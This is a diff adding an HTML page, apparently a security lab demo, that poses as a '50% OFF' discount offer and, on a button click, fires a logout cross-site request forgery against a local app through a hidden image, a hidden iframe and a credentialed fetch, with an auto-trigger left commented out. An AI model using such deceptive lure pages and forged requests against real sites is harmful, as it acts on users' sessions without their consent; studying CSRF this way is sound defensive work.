@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Special Discount</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f5f5f5;
+        }
+        .discount-card {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .discount-badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 20px;
+            display: inline-block;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="discount-card">
+        <h1>🎁 Special Discount! 🎁</h1>
+        <div class="discount-badge">50% OFF</div>
+        <h2>Limited Time Offer</h2>
+        <p>Click below to see your exclusive discount!</p>
+        <button onclick="showDiscount()">View My Discount</button>
+    </div>
+
+    <!-- Hidden elements for logout CSRF -->
+    <img id="logoutImg" style="display:none">
+    <iframe id="logoutFrame" style="display:none"></iframe>
+
+    <script>
+        function showDiscount() {
+            // Show fake loading
+            alert("Checking your discount eligibility...");
+
+            // Method 1: Using an img tag to trigger logout
+            const logoutImg = document.getElementById('logoutImg');
+            logoutImg.src = 'http://localhost:3000/api/logout';
+
+            // Method 2: Using an iframe
+            const logoutFrame = document.getElementById('logoutFrame');
+            logoutFrame.src = 'http://localhost:3000/api/logout';
+
+            // Method 3: Using fetch
+            fetch('http://localhost:3000/api/logout', {
+                credentials: 'include'
+            }).then(() => {
+                console.log('Logout CSRF attempt completed');
+            });
+
+            // Show fake discount
+            setTimeout(() => {
+                alert("Congratulations! You've been logged out! (This was actually a CSRF attack)");
+            }, 1000);
+        }
+
+        // Alternative: Auto-trigger on page load
+        // window.onload = function() {
+        //     showDiscount();
+        // }
+    </script>
+</body>
+</html> 
